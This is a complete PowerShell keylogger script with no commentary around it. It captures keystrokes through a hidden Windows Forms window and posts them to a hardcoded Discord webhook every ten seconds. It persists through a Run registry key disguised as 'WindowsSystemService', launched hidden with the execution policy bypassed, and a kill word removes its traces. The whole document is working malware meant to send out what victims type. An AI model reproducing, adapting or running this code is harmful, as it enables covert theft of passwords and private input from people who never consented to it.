$w = "https://discord.com/api/webhooks/1354862304818368753/00a1z0gP218HKXXcp2537RR0A635q3H5K0qIBviITk7XjJHsArVx2CadpC5q3WP1VS1f"
$k = "killme"
$p = "$env:APPDATA\s.ps1"
$l = ""
$t = ""

Add-Type -AssemblyName System.Windows.Forms
$form = New-Object Windows.Forms.Form
$form.KeyPreview = $true

$form.Add_KeyPress({
    $global:t += $_.KeyChar
    $global:l += $_.KeyChar

    if ($t -like "*$k") {
        $global:l += "`n[Stopped by kill word]`n"
        try { Invoke-RestMethod -Uri $w -Method POST -Body @{ content = $global:l } } catch {}
        try { Remove-Item $p -Force -ErrorAction SilentlyContinue } catch {}
        try { Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSystemService" -ErrorAction SilentlyContinue } catch {}
        $form.Close()
    }

    if ($t.Length -gt 100) { $t = $t.Substring($t.Length - 10) }
})

function Send-Log {
    if ($global:l.Length -gt 0) {
        try { Invoke-RestMethod -Uri $w -Method POST -Body @{ content = $global:l } } catch {}
        $global:l = ""
    }
}

$timer = New-Object Windows.Forms.Timer
$timer.Interval = 10000
$timer.Add_Tick({ Send-Log })
$timer.Start()

$form.WindowState = 'Minimized'
$form.ShowInTaskbar = $false
$form.ShowIcon = $false

# Save and persist
try {
    Set-Content -Path $p -Value $MyInvocation.MyCommand.Definition -Encoding UTF8
    reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WindowsSystemService /t REG_SZ /d "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File $p" /f | Out-Null
} catch {}

[Windows.Forms.Application]::Run($form)
